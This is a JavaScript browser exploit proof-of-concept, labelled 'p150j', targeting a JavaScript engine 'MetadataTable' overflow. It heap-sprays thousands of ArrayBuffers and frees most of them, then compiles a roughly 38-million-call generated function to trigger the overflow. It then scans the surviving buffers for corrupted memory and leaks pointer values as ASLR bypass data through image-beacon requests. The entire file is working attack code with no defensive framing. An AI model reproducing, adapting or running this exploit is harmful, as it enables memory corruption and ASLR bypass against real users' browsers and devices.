// p150j — MetadataTable overflow: single big wave spray
//
// p150g: 2400 buffers (240MB VM) → sweep crashed (not enough VM)
// p150i: 3×5000 waves → OOM during compilation (too much physical)
// p150j: ONE wave of 8000 buffers (764MB VM), free all but targets,
//        then compile. Physical at compile time = targets + blob + bytecodes.
//
// Beacon prefix: V150J-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V150J-' + tag + '&t=' + Date.now(); } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  var BUF_SZ = 100096;
  var SPRAY = 8000;

  // Phase 1: Single big spray
  var spray = [];
  var sprayOk = true;
  try {
    for (var i = 0; i < SPRAY; i++) {
      spray.push(new ArrayBuffer(BUF_SZ));
    }
  } catch(e) {
    sprayOk = false;
    B('SPRAY-OOM-' + spray.length);
  }
  if (sprayOk) B('SPRAY-OK-' + SPRAY);

  var sprayMB = Math.round(spray.length * BUF_SZ / 1048576);
  B('VM-' + sprayMB + 'MB');

  // Phase 2: Keep 500 targets spread evenly
  var TARGETS = 500;
  var tStride = Math.max(1, Math.floor(spray.length / TARGETS));
  var targets = [];
  var tViews = [];
  for (var i = 0; i < spray.length && targets.length < TARGETS; i += tStride) {
    targets.push(spray[i]);
    tViews.push(new Uint8Array(spray[i]));
  }
  B('TARGETS-' + targets.length);

  // Phase 3: Free the spray — MADV_FREE preserves VM mappings
  spray.length = 0;
  spray = null;
  B('FREED');

  // Phase 4: Aggressive GC
  for (var g = 0; g < 15; g++) {
    var junk = [];
    for (var j = 0; j < 20000; j++) junk.push({x: j});
    junk = null;
  }
  B('GC');

  // Phase 5: Compile 38M function
  var N = 38348816;
  B('BUILD');

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = ['window.__p150fn=function(a){'];
  for (var c = 0; c < nChunks; c++) parts.push(callChunk);
  parts.push('a();'.repeat(rem));
  parts.push('};window.__p150ok=1;');
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    if (!window.__p150ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');

    B('CALLING');
    try {
      window.__p150fn(function() { throw 'STOP'; });
    } catch(e) {
      B('CAUGHT-' + String(e).substring(0, 20));
    }

    B('SURVIVED');
    setTimeout(phaseScan, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;

  function phaseScan() {
    B('SCAN');
    var hitBufs = 0;
    var leaks = [];

    for (var i = 0; i < tViews.length; i++) {
      var view = tViews[i];
      if (!view) continue;

      var hasData = false;
      for (var s = 0; s < view.length; s += 112) {
        if (view[s + 12] !== 0 || view[s + 24] !== 0) { hasData = true; break; }
      }
      if (!hasData) continue;
      hitBufs++;

      if (hitBufs <= 10) {
        var nz = 0;
        for (var j = 0; j < view.length; j++) if (view[j]) nz++;
        B('HIT-' + i + '-nz' + nz);

        var ptrs = 0;
        for (var off = 24; off + 8 <= view.length && ptrs < 5; off += 112) {
          if (view[off] === 0 && view[off+1] === 0 && view[off+2] === 0 && view[off+3] === 0 &&
              view[off+4] === 0 && view[off+5] === 0 && view[off+6] === 0 && view[off+7] === 0) continue;
          B('PTR-' + i + '-O' + off + '=' + readHex8(view, off));
          ptrs++;
          if (leaks.length < 10) leaks.push(readHex8(view, off));
        }

        for (var off = 12; off + 4 <= view.length; off += 112) {
          if (readU32(view, off) === 0xFFFFFFFF) {
            B('FF-' + i + '-O' + off);
            break;
          }
        }
      }
    }

    B('RESULT-h' + hitBufs + '-l' + leaks.length);
    for (var l = 0; l < leaks.length; l++) B('ASLR-' + l + '-' + leaks[l]);
    B('DONE');
  }
})();
